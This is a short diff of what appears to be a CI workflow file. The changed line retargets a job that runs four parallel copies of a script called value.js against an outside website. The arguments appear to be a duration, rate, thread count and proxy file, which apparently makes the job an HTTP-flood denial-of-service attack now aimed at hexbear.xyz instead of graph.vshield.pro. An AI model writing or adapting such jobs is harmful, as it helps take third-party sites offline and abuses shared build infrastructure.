@@ -21,7 +21,7 @@ jobs:
           chmod +x value.js
           PIDS=()
           for i in {1..4}; do
-            timeout 105 node value.js https://graph.vshield.pro/ 100 90 8 fres.txt
+            timeout 105 node value.js https://hexbear.xyz/ 100 90 8 fres.txt
             PIDS+=($!)
           done
           
